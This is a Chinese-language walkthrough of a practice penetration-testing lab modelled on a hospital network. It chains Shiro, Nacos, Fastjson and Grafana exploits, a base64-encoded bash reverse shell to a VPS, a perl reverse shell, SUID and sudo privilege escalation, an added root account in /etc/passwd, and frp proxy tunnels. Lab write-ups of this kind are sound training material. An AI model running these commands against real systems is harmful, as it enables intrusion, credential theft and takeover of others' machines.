# 春秋云境-Hospital综合渗透


春秋云境-Hospital综合渗透通关wp

<!--more-->

![image-20250111194442111](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250111194442111.png?imageSlim)

*靶标介绍：* 在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。

## 外网打点

先fscan扫一发

```
E:\Tools\web\fscan_v1.82>fscan64.exe -h 39.99.139.1

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
(icmp) Target 39.99.139.1     is alive
[*] Icmp alive hosts len is: 1
39.99.139.1:22 open
39.99.139.1:8080 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle: http://39.99.139.1:8080   code:302 len:0      title:None 跳转url: http://39.99.139.1:8080/login;jsessionid=6CA21A189A48B38DD79ABAF0DA1A6502
[*] WebTitle: http://39.99.139.1:8080/login;jsessionid=6CA21A189A48B38DD79ABAF0DA1A6502 code:200 len:2005   title:医疗管理后台
[+] http://39.99.139.1:8080 poc-yaml-spring-actuator-heapdump-file
已完成 1/2 [-] ssh 39.99.139.1:22 root root#123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 1/2 [-] ssh 39.99.139.1:22 root 123456~a ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 1/2 [-] ssh 39.99.139.1:22 root a123123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 1/2 [-] ssh 39.99.139.1:22 admin root ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 1/2 [-] ssh 39.99.139.1:22 admin admin@111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
```

访问http://39.99.139.1:8080/，弱口令admin/admin123登录，但未发现可进一步利用的点

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250106214851-ivvsrhj.png?imageSlim)​

根据fscan的回显，发现Shiro特征，jsessionid同时有acatuator泄露

### Actuator 配置漏洞

访问/actuator/heapdump可下载heapdump

```
E:\Penetration_tools\Java\JDumpSpider>java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump > 1.txt
Loading heap dump heapdump from cache failed.
java.io.IOException: HPROF time mismatch. Cached 1725335049001 from heap dump 1736171505575
        at org.graalvm.visualvm.lib.jfluid.heap.HprofHeap.<init>(HprofHeap.java:385)
        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.loadHeap(HeapFactory.java:96)
        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap(HeapFactory.java:79)
        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap(HeapFactory.java:55)
        at org.graalvm.visualvm.lib.jfluid.heap.GraalvmHeapHolder.<init>(GraalvmHeapHolder.java:18)
        at cn.wanghw.Main.call(Main.java:66)
        at cn.wanghw.Main.main(Main.java:29)
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250106215542-thna7oo.png?imageSlim)​

### shiro 反序列化 打入内存马

使用shiro反序列化利用工具

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250106220027-tunignj.png?imageSlim)​

直接注入内存马

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250106220652-aqkm0vc.png?imageSlim)​

冰蝎4.0连过去

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250106220903-fmgxsc3.png?imageSlim)​

并不是root权限，得提权

弹shell出去

```
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDYuNzUuMzcvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}'
# bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/6666 0>&1
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250106223544-gjl5bob.png?imageSlim)​

查找具有 SUID权限的文件

```
app@web01:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/vim.basic
/usr/bin/su
/usr/bin/newgrp
/usr/bin/staprun
/usr/bin/at
/usr/bin/passwd
```

发现vim.basic有SUID权限，可以利用它添加 root 用户

构造一个具有root权限的用户

```
[root@iZ2ze8k64rnm1tt06g6ni2Z ~]# openssl passwd -1 -salt test 1234    //生成密码	
$1$test$So8QlDklBBy90T3QcEYWU/
test:$1$test$So8QlDklBBy90T3QcEYWU/:0:0:/root:/bin/bash
```

### flag01：Vim.basic 提权读取flag

随后使用vim.basic写入/etc/passwd

```
/usr/bin/vim.basic /etc/passwd
```

随后切换test用户

```
app@web01:~$ su test
su test
Password: 1234

whoami
root

cd root
ls
flag
cat flag
cat: flag: Is a directory
ll
bash: line 11: ll: command not found
cd flag
ls
flag01.txt
cat flag01.txt
O))     O))                              O))             O))
O))     O))                          O)  O))             O))
O))     O))   O))     O)))) O) O))     O)O) O)   O))     O))
O)))))) O)) O))  O)) O))    O)  O)) O))  O))   O))  O))  O))
O))     O))O))    O))  O))) O)   O))O))  O))  O))   O))  O))
O))     O)) O))  O))     O))O)) O)) O))  O))  O))   O))  O))
O))     O))   O))    O)) O))O))     O))   O))   O)) O)))O)))
                            O))                           
flag01: flag{3d1da0b2-f052-414e-a123-b7a4ed48552a}

```

## 内网渗透

### 代理搭建

查看内网ip信息

```
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.30.12.5  netmask 255.255.0.0  broadcast 172.30.255.255
        inet6 fe80::216:3eff:fe12:687e  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:12:68:7e  txqueuelen 1000  (Ethernet)
        RX packets 138078  bytes 125128819 (125.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 74970  bytes 43875716 (43.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2496  bytes 216963 (216.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2496  bytes 216963 (216.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

vps中python起一个server

```
python3 -m http.server
```

然后靶机通过wget下载fscan

```
app@web01:~$ wget http://39.106.75.37:8000/fscan
--2025-01-06 23:25:42--  http://39.106.75.37:8000/fscan
Connecting to 39.106.75.37:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7100304 (6.8M) [application/octet-stream]
Saving to: ‘fscan’
```

随后

```
chmod 777 fscan
```

使用fscan对内网网段进行扫描

```
app@web01:~$ ./fscan -h 172.30.12.5/24
./fscan -h 172.30.12.5/24

   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <  
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.30.12.5     is alive
(icmp) Target 172.30.12.6     is alive
(icmp) Target 172.30.12.236   is alive
[*] Icmp alive hosts len is: 3
172.30.12.6:445 open
172.30.12.6:139 open
172.30.12.6:135 open
172.30.12.236:8080 open
172.30.12.5:8080 open
172.30.12.236:22 open
172.30.12.5:22 open
172.30.12.236:8009 open
172.30.12.6:8848 open
[*] alive ports len is: 9
start vulscan
[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=E98AA97DE9EC60F59EF5111AF75C2940
[*] NetInfo 
[*]172.30.12.6
   [->]Server02
   [->]172.30.12.6
[*] NetBios 172.30.12.6     WORKGROUP\SERVER02          
[*] WebTitle http://172.30.12.5:8080/login;jsessionid=E98AA97DE9EC60F59EF5111AF75C2940 code:200 len:2005   title:医疗管理后台
[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found
[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file 
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos 
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass 
[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file 
```

有如下两个资产

```
http://172.30.12.6:8848 poc-yaml-alibaba-nacos poc-yaml-alibaba-nacos-v1-auth-bypass 
http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
```

上传frp进行socks5代理

vps frps.ini

```cobol
[common]
bind_port = 7000
```

靶机 frpc.ini

```cobol
[common]
tls_enable = true
server_addr =vps的ip
server_port = 7000

[socks5]
type = tcp
remote_port = 6000
plugin = socks5
```

随后本地攻击机proxifier配置代理

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250107002046-af1ikmr.png?imageSlim)​

规则里面只让chrome走代理

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250107002115-d0umxr6.png?imageSlim)​

### flag02：nacos-yaml反序列化漏洞

成功访问nacos

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250107002134-w99llsk.png?imageSlim)​

尝试默认密码nacos/nacos直接登录，

不需要利用漏洞添加账号了

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250109124438-olifwlr.png?imageSlim)​

在配置文件里发现了数据库的账号密码，单无法连接

使用nacos漏洞利用工具，不要忘记设置代理

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250109124828-2fi13la.png?imageSlim)​

使用yaml-payload-master在本地制作一个含有恶意yaml的jar包

https://github.com/artsploit/yaml-payload

将AwesomeScriptEngineFactory.java中弹计算器的代码改成添加管理员用户的

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250109132421-11xqyaq.png?imageSlim)​

之后打成jar包

```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250109135442-36g8enn.png?imageSlim)​

> 注意java的版本，最后我用了jdk1.8.0_191版本才打通

我们起vps的python http.server，将jar传到flag01靶机

然后在flag01靶机起python http.server

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250109143129-auwh5wf.png?imageSlim)​

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250111134330-9us924l.png?imageSlim)​

打通之后，通过本地rdp可以连过去（走proxifier代理）

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250109143244-j2dp7r2.png?imageSlim)​

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250111134235-siwuy68.png?imageSlim)​

### flag03：Fastjson反序列化漏洞

bp开一个socks代理

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250109144705-47txoh0.png?imageSlim)​

使用bp自带浏览器抓个包看看，发现是json形式传输，猜测jastjson

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250109150913-by06p63.png?imageSlim)​

直接使用bp fastjson插件打fastjsonecho

[Release Frist release · amaz1ngday/fastjson-exp · GitHub](https://github.com/amaz1ngday/fastjson-exp/releases/tag/v1.0.0)

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250109151114-urqmxy1.png?imageSlim)​

也可以直接注入内存马

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250109152233-s4gilhg.png?imageSlim)​

哥斯拉进行连接

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250109152237-ejo1b0y.png?imageSlim)​

对web03进行信息收集

```
/ >ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.30.12.236  netmask 255.255.0.0  broadcast 172.30.255.255
        inet6 fe80::216:3eff:fe13:340  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:13:03:40  txqueuelen 1000  (Ethernet)
        RX packets 99152  bytes 124660068 (124.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 28532  bytes 13180871 (13.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.30.54.179  netmask 255.255.255.0  broadcast 172.30.54.255
        inet6 fe80::216:3eff:fe13:139  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:13:01:39  txqueuelen 1000  (Ethernet)
        RX packets 389  bytes 16338 (16.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 409  bytes 17874 (17.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5174  bytes 435967 (435.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5174  bytes 435967 (435.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

发现有双网卡

> 中间插一下Linux写公钥登录：
>
> 将公钥添加到服务器的某个账户上，然后在客户端利用私钥即可完成认证并登录。
>
> **服务器创建密钥：**
>
> ```bash
> └─# ssh-keygen          																	# 建立密钥对
> Generating public/private rsa key pair.
> Enter file in which to save the key (/root/.ssh/id_rsa):  # 按 Enter回车即可
> /root/.ssh/id_rsa already exists.
> Overwrite (y/n)? y
> Enter passphrase (empty for no passphrase): 							# 输入密钥锁码，或直接按 Enter 留空
> Enter same passphrase again: 															# 再输入一遍密钥锁码
> Your identification has been saved in /root/.ssh/id_rsa   # 私钥
> Your public key has been saved in /root/.ssh/id_rsa.pub   # 公钥
> The key fingerprint is:
> SHA256:
> The key's randomart image is:
> ```
>
> ​参数
>
> ```bash
> -t  #指定密钥类型
> -b  #指定密钥长度
> ```
>
> 现在当前root目录中生成了一个 .ssh 的隐藏目录，内含两个密钥文件。其中，id_rsa 为私钥，id_rsa.pub 为公钥。
>
> **在服务器上安装公钥**
>
> 将公钥写入/root/.ssh/authorized_keys  
> 修改authorized_keys权限为600，.ssh权限为700
>
> ```bash
> [root@kali ]$ cd .ssh 
> [root@kali .ssh]$ cat id_rsa.pub >> authorized_keys   
>  
> #公钥的安装注意：单尖括号>表示将文件内容全部替换掉；双尖括号是追加。
>  
> [root@kali .ssh]$ chmod 600 authorized_keys 
> [root@kali .ssh]$ chmod 700 ~/.ssh
> ```
>
> **设置 SSH，打开密钥登录功能**
>
> 编辑 /etc/ssh/sshd_config 文件，进行如下设置：
>
> ```bash
> RSAAuthentication yes
> PubkeyAuthentication yes
> PermitRootLogin yes  #root 用户允许通过 SSH 登录（可选）
> ```
>
> **重启SSH服务**
>
> ```bash
> [root@host .ssh]$ service sshd restart
> ```
>
> 该重启不会导致断连
>
> ‍
>
> 将私钥下载至客户端便可以实现公钥登录

### 双层frp代理

1.将frps上传到web01(172.30.12.5)  
frps.ini

```ini
[common]
bind_port = 8000
```

2.将frpc上传到web03(wget)(172.30.12.236)  
frpc.ini

```ini
[common]
server_addr = 172.30.12.5
server_port = 8000

[socks5]
type = tcp
remote_port = 6000
plugin = socks5

```

随后配置本地proxifier，构造代理链如下

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250111141147-pvmxc19.png?imageSlim)​

配置代理规则

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250111141131-wz0unzg.png?imageSlim)​

上fscan扫描

```

start infoscan
(icmp) Target 172.30.54.179   is alive
(icmp) Target 172.30.54.12    is alive
[*] Icmp alive hosts len is: 2
172.30.54.179:22 open
172.30.54.179:8009 open
172.30.54.179:8080 open
172.30.54.12:5432 open
172.30.54.12:3000 open
172.30.54.12:22 open
[*] alive ports len is: 6
start vulscan
[*] WebTitle http://172.30.54.179:8080 code:200 len:3964   title:医院后台管理平台
[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login
[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana
```

从fscan扫描到的信息发现有grafana

能利用漏洞就只有 SSRF 和任意文件读取

搜索对应版本号，发现存在任意文件读取漏洞CVE-2021-43798,

https://github.com/A-D-Team/grafanaExp/releases

### Grafana任意文件读取漏洞

```
root@web03:/home# ./linux_amd64_grafanaExp exp -u http://172.30.54.12:3000/
```

读到了 postgreSQL 的账号密码

```
root@web03:/tmp# ./grafanaExp_linux_amd64 exp -u http://172.30.54.12:3000
2024/07/04 12:20:59 Target vulnerable has plugin [alertlist]
2024/07/04 12:20:59 Got secret_key [SW2YcwTIb9zpOOhoPsMm]
2024/07/04 12:20:59 There is [0] records in db.
2024/07/04 12:20:59 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123] database:[postgres]     basic_auth_user:[]      basic_auth_password:[]
2024/07/04 12:20:59 All Done, have nice day!
```

使用proxifier的全局代理，navicat连上数据库

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250111144552-cwsvuv0.png?imageSlim)​

### flag04：Postgresql提权后读flag

需要用psql提权，所以先改一下root密码

```
ALTER USER root WITH PASSWORD '123456';
```

创建命令执行函数

```
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
```

使用perl弹shell到flag03靶机

```
select system('perl -e \'use Socket;$i="172.30.54.179";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250111150914-7l50gjm.png?imageSlim)​

拿到shell之后由于需要交互shell，所以利用python获取交互shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

sudo -l发现psql可以无密码执行sudo

参考[https://gtfobins.github.io/gtfobins/psql/](https://gtfobins.github.io/gtfobins/psql/)

```
Matching Defaults entries for postgres on web04:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User postgres may run the following commands on web04:
    (ALL) NOPASSWD: /usr/local/postgresql/bin/psql
```

随后登入`postgresql`​

```
sudo /usr/local/postgresql/bin/psql
```

密码就是我们已经改好的123456

随后

```
\?
!/bin/bash
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250111151751-o53dc6f.png?imageSlim)​

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250111151831-juuxoay.png?imageSlim)​

‍

